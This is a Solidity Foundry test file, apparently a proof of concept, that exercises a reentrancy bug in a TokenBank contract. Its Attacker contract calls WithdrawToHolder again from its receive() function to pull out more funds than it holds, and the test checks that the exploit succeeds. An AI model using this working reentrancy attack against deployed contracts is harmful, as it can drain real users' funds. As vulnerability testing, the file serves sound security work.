
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Make attacker the owner so it can call WithdrawToHolder
        _contractUnderTest.changeOwner(address(_attacker));
        vm.prank(address(_attacker));
        _contractUnderTest.confirmOwner();

        // Fund the bank on behalf of the attacker so it becomes a holder
        vm.prank(address(_attacker));
        _contractUnderTest.Deposit{value: attackVal}();

        // Sanity: attacker is a holder
        assertGt(_contractUnderTest.Holders(address(_attacker)), 0);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = TokenBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // First call to vulnerable function
        _victim.WithdrawToHolder(address(this), val);

        // If we managed to re-enter at least once and drained more than initial,
        // mark exploit as succeeded.
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before Holders[address(this)] is fully updated
            _victim.WithdrawToHolder(address(this), storedAttackVal);
        }
    }
}
